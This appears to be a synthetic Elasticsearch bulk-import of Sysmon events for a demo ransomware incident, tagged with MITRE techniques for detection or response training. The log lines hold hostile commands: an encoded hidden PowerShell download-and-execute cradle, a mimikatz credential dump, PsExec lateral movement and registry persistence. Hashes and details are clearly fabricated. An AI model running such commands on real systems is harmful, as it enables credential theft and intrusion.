{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-001"}}
{"@timestamp":"2025-11-14T02:17:43.112Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"W10-HR-05","ip":"10.10.5.33","os":{"name":"Windows 10 Pro","version":"10.0.19045"}},"process":{"name":"WINWORD.EXE","pid":4821,"executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","command_line":"\"WINWORD.EXE\" /n \"C:\\Users\\ivanova_e\\Downloads\\Приказ_HR_ноябрь.docx\"","parent":{"name":"explorer.exe","pid":3120}},"user":{"name":"ivanova_e","domain":"ROSTECH"},"winlog":{"event_id":1,"computer_name":"W10-HR-05.rostech.local"},"tags":["CASE-2025-001","initial-access"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1566.001","mitre_tactic":"TA0001"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-002"}}
{"@timestamp":"2025-11-14T02:31:05.887Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"W10-HR-05","ip":"10.10.5.33","os":{"name":"Windows 10 Pro"}},"process":{"name":"payload.exe","pid":5104,"executable":"C:\\Users\\ivanova_e\\AppData\\Local\\Temp\\payload.exe","hash":{"md5":"5f4dcc3b5aa765d61d8327deb882cf99","sha256":"5f4dcc3b5aa765d61d8327deb882cf99a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"},"command_line":"C:\\Users\\ivanova_e\\AppData\\Local\\Temp\\payload.exe","parent":{"name":"WINWORD.EXE","pid":4821}},"user":{"name":"ivanova_e","domain":"ROSTECH"},"winlog":{"event_id":1,"computer_name":"W10-HR-05.rostech.local"},"tags":["CASE-2025-001","execution","malware","lockbit"],"iris":{"case_id":"CASE-2025-001","ioc":"5f4dcc3b5aa765d61d8327deb882cf99","mitre_technique":"T1204.002","mitre_tactic":"TA0002"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-003"}}
{"@timestamp":"2025-11-14T02:33:22.441Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"process":{"name":"powershell.exe","pid":5388,"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAtAHMAZQByAHYAaQBjAGUALgByAHUALwBwAGEAeQBsAG8AYQBkACcAKQA=","parent":{"name":"payload.exe","pid":5104}},"user":{"name":"ivanova_e","domain":"ROSTECH"},"winlog":{"event_id":1},"tags":["CASE-2025-001","execution","powershell"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1059.001","mitre_tactic":"TA0002"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-004"}}
{"@timestamp":"2025-11-14T02:35:14.209Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"process":{"name":"mimikatz.exe","pid":5612,"executable":"C:\\Users\\ivanova_e\\AppData\\Local\\Temp\\mimikatz.exe","command_line":"mimikatz.exe \"sekurlsa::logonpasswords\" \"exit\"","parent":{"name":"payload.exe","pid":5104}},"user":{"name":"ivanova_e","domain":"ROSTECH"},"winlog":{"event_id":1},"tags":["CASE-2025-001","credential-access","mimikatz"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1003.001","mitre_tactic":"TA0006"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-005"}}
{"@timestamp":"2025-11-14T02:35:17.003Z","event":{"kind":"event","category":["process"],"type":["access"],"code":"10","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"process":{"name":"mimikatz.exe","pid":5612},"target":{"process":{"name":"lsass.exe","pid":744}},"winlog":{"event_id":10},"tags":["CASE-2025-001","credential-access","lsass-dump"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1003.001","mitre_tactic":"TA0006"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-006"}}
{"@timestamp":"2025-11-14T03:02:08.551Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"process":{"name":"PsExec.exe","pid":6204,"executable":"C:\\Windows\\Temp\\PsExec.exe","command_line":"PsExec.exe \\\\DC-01 -u ROSTECH\\admin_backup -p *** cmd.exe","parent":{"name":"payload.exe","pid":5104}},"user":{"name":"admin_backup","domain":"ROSTECH"},"winlog":{"event_id":1},"tags":["CASE-2025-001","lateral-movement","psexec"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1021.002","mitre_tactic":"TA0008"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-007"}}
{"@timestamp":"2025-11-14T03:18:33.774Z","event":{"kind":"event","category":["registry"],"type":["creation"],"code":"12","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"DC-01","ip":"10.10.1.10"},"registry":{"key":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","value":"updater32","data":"C:\\Windows\\Temp\\updater32.exe"},"process":{"name":"cmd.exe","pid":7841},"user":{"name":"admin_backup","domain":"ROSTECH"},"winlog":{"event_id":12},"tags":["CASE-2025-001","persistence","registry"],"iris":{"case_id":"CASE-2025-001","ioc":"HKLM\\SOFTWARE\\Microsoft\\Windows\\Run\\updater32","mitre_technique":"T1547.001","mitre_tactic":"TA0003"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-008"}}
{"@timestamp":"2025-11-14T03:45:21.002Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"DC-01","ip":"10.10.1.10"},"process":{"name":"net.exe","pid":8120,"command_line":"net view /domain","parent":{"name":"cmd.exe","pid":7841}},"user":{"name":"admin_backup","domain":"ROSTECH"},"winlog":{"event_id":1},"tags":["CASE-2025-001","discovery"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1018","mitre_tactic":"TA0007"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-009"}}
{"@timestamp":"2025-11-14T03:45:44.118Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"DC-01","ip":"10.10.1.10"},"process":{"name":"nltest.exe","pid":8155,"command_line":"nltest /dclist:rostech.local","parent":{"name":"cmd.exe","pid":7841}},"user":{"name":"admin_backup","domain":"ROSTECH"},"winlog":{"event_id":1},"tags":["CASE-2025-001","discovery"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1018","mitre_tactic":"TA0007"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-010"}}
{"@timestamp":"2025-11-14T04:45:11.330Z","event":{"kind":"event","category":["process"],"type":["start"],"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"DC-01","ip":"10.10.1.10"},"process":{"name":"lockbit3.exe","pid":9102,"executable":"C:\\Windows\\Temp\\lockbit3.exe","hash":{"md5":"5f4dcc3b5aa765d61d8327deb882cf99","sha256":"5f4dcc3b5aa765d61d8327deb882cf99a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"},"command_line":"lockbit3.exe -spread -gpo","parent":{"name":"updater32.exe","pid":7990}},"user":{"name":"SYSTEM","domain":"NT AUTHORITY"},"winlog":{"event_id":1},"tags":["CASE-2025-001","impact","ransomware","lockbit"],"iris":{"case_id":"CASE-2025-001","ioc":"5f4dcc3b5aa765d61d8327deb882cf99","mitre_technique":"T1486","mitre_tactic":"TA0040"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-011"}}
{"@timestamp":"2025-11-14T04:45:55.002Z","event":{"kind":"event","category":["file"],"type":["change"],"code":"11","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"FILE-SRV-02","ip":"10.10.1.22"},"file":{"path":"D:\\Shared\\Finance\\budget_2025.xlsx.locked","extension":".locked"},"process":{"name":"lockbit3.exe","pid":9220},"winlog":{"event_id":11},"tags":["CASE-2025-001","impact","file-encryption"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1486","mitre_tactic":"TA0040"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-012"}}
{"@timestamp":"2025-11-14T03:18:50.005Z","event":{"kind":"event","category":["network"],"type":["connection"],"code":"3","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"DC-01","ip":"10.10.1.10"},"network":{"direction":"egress","transport":"tcp","protocol":"https"},"source":{"ip":"10.10.1.10","port":49812},"destination":{"ip":"162.247.74.201","port":443,"domain":"cobalt-update.com"},"process":{"name":"updater32.exe","pid":7990},"winlog":{"event_id":3},"tags":["CASE-2025-001","c2","apt","fancy-bear"],"iris":{"case_id":"CASE-2025-001","ioc":"cobalt-update[.]com","mitre_technique":"T1071.001","mitre_tactic":"TA0011"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-013"}}
{"@timestamp":"2025-11-14T04:15:03.887Z","event":{"kind":"event","category":["network"],"type":["connection"],"code":"3","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"FILE-SRV-02","ip":"10.10.1.22"},"network":{"direction":"egress","transport":"tcp","protocol":"https"},"source":{"ip":"10.10.1.22","port":50211},"destination":{"ip":"162.247.74.201","port":443},"process":{"name":"payload.exe","pid":8830},"winlog":{"event_id":3},"tags":["CASE-2025-001","exfiltration","tor"],"iris":{"case_id":"CASE-2025-001","ioc":"162.247.74.201","mitre_technique":"T1041","mitre_tactic":"TA0010"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-014"}}
{"@timestamp":"2025-11-14T03:02:11.220Z","event":{"kind":"event","category":["network"],"type":["connection"],"code":"3","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"network":{"direction":"egress","transport":"tcp","protocol":"smb"},"source":{"ip":"10.10.5.33","port":49922},"destination":{"ip":"10.10.1.10","port":445},"process":{"name":"PsExec.exe","pid":6204},"winlog":{"event_id":3},"tags":["CASE-2025-001","lateral-movement"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1021.002","mitre_tactic":"TA0008"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"sysmon-015"}}
{"@timestamp":"2025-11-14T03:19:05.441Z","event":{"kind":"event","category":["driver"],"type":["start"],"code":"6","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"DC-01","ip":"10.10.1.10"},"file":{"path":"C:\\Windows\\System32\\drivers\\ndis_helper.sys","hash":{"md5":"aabbccdd11223344aabbccdd11223344"}},"process":{"name":"updater32.exe","pid":7990},"winlog":{"event_id":6},"tags":["CASE-2025-001","defense-evasion","driver-load"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1014","mitre_tactic":"TA0005"}}
